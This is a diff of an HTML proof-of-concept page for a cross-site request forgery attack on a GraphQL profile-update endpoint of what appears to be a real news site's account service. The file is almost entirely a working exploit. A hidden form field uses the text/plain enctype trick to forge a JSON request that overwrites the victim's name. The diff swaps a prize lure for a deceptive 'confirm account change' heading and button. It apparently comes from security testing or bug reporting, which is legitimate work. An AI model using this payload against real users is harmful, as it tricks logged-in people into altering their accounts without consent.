@@ -1,9 +1,9 @@
 <html>
   <body>
-    <h1>Klik tombol ini untuk hadiah!</h1>
+    <h1>Konfirmasi Perubahan Akun</h1>
     <form action="https://mijnomgeving.ad.nl/api/graphql" method="POST" enctype="text/plain">
-      <input type="hidden" name='{"extensions":{"persistedQuery":{"sha256Hash":"a1890200624c3b3da317020451be417313cc971805d850bfff0442aeea1b4fca","version":1}},"operationName":"UpdateAccountProfile","variables":{"input":{"firstName":"HACKED-BY-CSRF","lastName":"TEST","gender":"MALE","dateOfBirth":"2001-06-10","phoneNumber":""}}, "ignore":"' value='"}'>
-      <input type="submit" value="Klik Disini!">
+      <input type="hidden" name='{"extensions":{"persistedQuery":{"sha256Hash":"a1890200624c3b3da317020451be417313cc971805d850bfff0442aeea1b4fca","version":1}},"operationName":"UpdateAccountProfile","variables":{"input":{"firstName":"CSRF_SUCCEEDED","lastName":"ATTACKER","gender":"MALE","dateOfBirth":"2001-06-10","phoneNumber":""}},"padding":"' value='"}'>
+      <input type="submit" value="Klik untuk Konfirmasi">
     </form>
   </body>
 </html>
